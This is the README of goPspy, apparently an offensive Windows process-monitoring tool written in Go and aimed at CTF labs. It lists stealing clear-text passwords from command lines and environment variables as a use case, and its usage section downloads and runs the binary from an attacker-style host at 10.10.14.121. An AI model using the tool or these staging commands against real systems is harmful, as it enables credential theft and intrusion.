######
goPspy
######

| Same concept as pspy but for windows, using Golang.
| For files and pipes monitoring : https://github.com/charlesgargasson/gofspy
|
| Use cases

* Detect any recurring/planned activity on machine (usefull for bots into CTFs challenges)
* Steal clear passwords from cmdline or env
* Check for (unwanted) privileges

|
| Similar projects :

* https://github.com/xct/winpspy (include files monitoring as well)

|

| Retrieved infos when you have rights on process

* PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ
    * cmdline
    * workdir
    * environment
    * user
    * session
    * privileges
    * restricted
    * elevated (UAC status)
    * integrity level
    * pid
    * exepath
* PROCESS_QUERY_INFORMATION
    * user
    * session
    * privileges
    * restricted
    * elevated (UAC status)
    * integrity level
    * pid
    * exepath
* PROCESS_QUERY_LIMITED_INFORMATION
    * pid
    * exepath

|

| Retrieved infos if unable to open any handle

* pid
* exename

|

*****
Build
*****

| crosscompile

.. code-block:: bash

    sudo bash dockerbuild.sh
    sudo cp bin/gopspy.exe /var/www/html/
    sudo cp bin/gopspy32.exe /var/www/html/
    sudo chmod 644 /var/www/html/gopspy*.exe

|
| Pre-compiled releases, for lab/ctf (don't trust binaries from strangers)

- https://dl.offensive.run/compiledmyself/gopspy.exe
- https://dl.offensive.run/compiledmyself/gopspy32.exe

|

*****
Usage
*****

| The program run indefinitely

.. code-block:: bash

    curl.exe http://10.10.14.121/gopspy.exe -o gopspy.exe
    Start-Process -NoNewWindow -FilePath "C:\Users\user\Desktop\gopspy.exe"
    Start-Process -NoNewWindow -FilePath "C:\Users\user\Desktop\gopspy.exe" -ArgumentList "-getenv"
    # wget http://10.10.14.121/gopspy.exe -O gopspy.exe
    
.. code-block:: bash

    Stop-Process -Name "gopspy"
    taskkill /F /IM gopspy.exe
    
|

******
Output
******

.. code-block::

    -------------------------------------------------- 16:20:34 --------------------------------------------------

    PID: 9252
    EXE: msedge.exe
    CMD: "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --no-startup-window --win-session-start
    DIR: C:\Program Files (x86)\Microsoft\Edge\Application\134.0.3124.72\
    ELEVATED (UAC): false
    RESTRICTED: false
    INTEGRITY: MEDIUM
    USER: w11\user
    SESSION: 1
    PRIVILEGES:
    - SeUndockPrivilege: false
    - SeIncreaseWorkingSetPrivilege: false
    - SeTimeZonePrivilege: false
    - SeShutdownPrivilege: false
    - SeChangeNotifyPrivilege: true
    PTREE: 5436 > 5484 explorer.exe > 9252

    -------------------------------------------------- 16:21:55 --------------------------------------------------

    PID: 15952
    CMD: "C:\Windows\system32\whoami.exe"
    DIR: C:\Users\user\Desktop\
    ELEVATED (UAC): false
    RESTRICTED: false
    INTEGRITY: MEDIUM
    USER: w11\user
    SESSION: 1
    PRIVILEGES:
    - SeShutdownPrivilege: false
    - SeChangeNotifyPrivilege: true
    - SeUndockPrivilege: false
    - SeIncreaseWorkingSetPrivilege: false
    - SeTimeZonePrivilege: false
    PTREE: 5436 > 5484 explorer.exe > 17436 powershell.exe > 15952

|

***********
Third Party
***********

| goPspy don't relies on third party libraries

|